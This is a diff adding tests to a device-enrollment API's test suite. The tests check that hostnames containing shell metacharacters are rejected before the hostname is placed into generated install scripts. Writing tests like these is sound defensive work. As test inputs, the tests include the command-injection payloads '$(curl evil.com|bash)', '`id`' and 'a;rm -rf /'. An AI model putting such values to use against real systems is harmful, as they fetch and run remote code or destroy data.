@@ -92,6 +92,116 @@ describe('POST /api/devices (enroll)', () => {
 
     expect(res.status).toBe(400);
   });
+
+  // -------------------------------------------------------------------------
+  // Security: hostname charset validation at creation (command-injection fix)
+  // device.hostname is admin-supplied here and later interpolated into
+  // generated PowerShell/bash install scripts. A malicious hostname like
+  // $(curl evil.com|bash) must be rejected at the input boundary.
+  // -------------------------------------------------------------------------
+
+  test('rejects command-injection hostname at creation (Layer 1)', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: '$(curl evil.com|bash)', owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+    expect(res.body.error).toBeDefined();
+    // Must NOT have inserted the device or written an audit entry
+    const insertCall = mockPool.query.mock.calls.find(
+      c => c[0].includes('INSERT INTO devices')
+    );
+    expect(insertCall).toBeUndefined();
+  });
+
+  test('rejects backtick command-injection hostname at creation', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: '`id`', owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+  });
+
+  test('rejects hostname with shell metacharacters (semicolon, pipe, $)', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: 'a;rm -rf /', owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+  });
+
+  test('rejects hostname with spaces', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: 'bad host', owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+  });
+
+  test('rejects hostname with a leading hyphen', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: '-bad', owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+  });
+
+  test('rejects hostname with a trailing hyphen', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: 'bad-', owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+  });
+
+  test('rejects hostname containing a dot (outside safe charset)', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: 'host.example.com', owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+  });
+
+  test('rejects hostname longer than 63 characters', async () => {
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: 'a'.repeat(64), owner_name: 'Mal' });
+
+    expect(res.status).toBe(400);
+  });
+
+  test('accepts a valid RFC-label hostname (guards against over-rejection)', async () => {
+    const newDevice = { id: 'dev-ok', hostname: 'DEV-001', owner_name: 'Alice', status: 'active', api_key_hash: 'h' };
+    mockPool.query.setResult('INSERT INTO devices', { rows: [newDevice] });
+
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: 'DEV-001', owner_name: 'Alice' });
+
+    expect(res.status).toBe(201);
+    expect(res.body.hostname).toBe('DEV-001');
+  });
+
+  test('accepts a single-character alphanumeric hostname', async () => {
+    const newDevice = { id: 'dev-ok', hostname: 'X', owner_name: 'Alice', status: 'active', api_key_hash: 'h' };
+    mockPool.query.setResult('INSERT INTO devices', { rows: [newDevice] });
+
+    const res = await request(app)
+      .post('/api/devices')
+      .set('Authorization', `Bearer ${makeToken()}`)
+      .send({ hostname: 'X', owner_name: 'Alice' });
+
+    expect(res.status).toBe(201);
+  });
 });
 
 // ---------------------------------------------------------------------------
